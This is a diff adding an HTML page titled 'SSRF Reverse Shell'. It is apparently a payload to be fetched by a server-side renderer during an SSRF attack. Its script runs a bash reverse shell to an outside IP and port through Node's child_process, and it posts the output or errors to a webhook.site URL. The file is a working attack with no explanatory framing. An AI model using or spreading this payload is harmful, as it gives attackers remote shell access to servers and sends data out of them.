@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SSRF Reverse Shell</title>
+</head>
+<body>
+    <h1>Shelling...</h1>
+    <script>
+        const webhook = 'https://webhook.site/547f93ad-ea8e-40ea-bd32-e986fa242f84';
+        
+        // Reverse shell payload
+        try {
+            const { exec } = require('child_process');
+            const shell = "bash -i >& /dev/tcp/13.202.226.61/13516 0>&1"; // ngrok IP and port
+            exec(shell, (err, stdout, stderr) => {
+                fetch(webhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: 'shellResult=' + encodeURIComponent(err ? err.message : stdout || stderr)
+                });
+            });
+        } catch (e) {
+            fetch(webhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: 'shellError=' + encodeURIComponent(e.message)
+            });
+        }
+    </script>
+</body>
+</html>
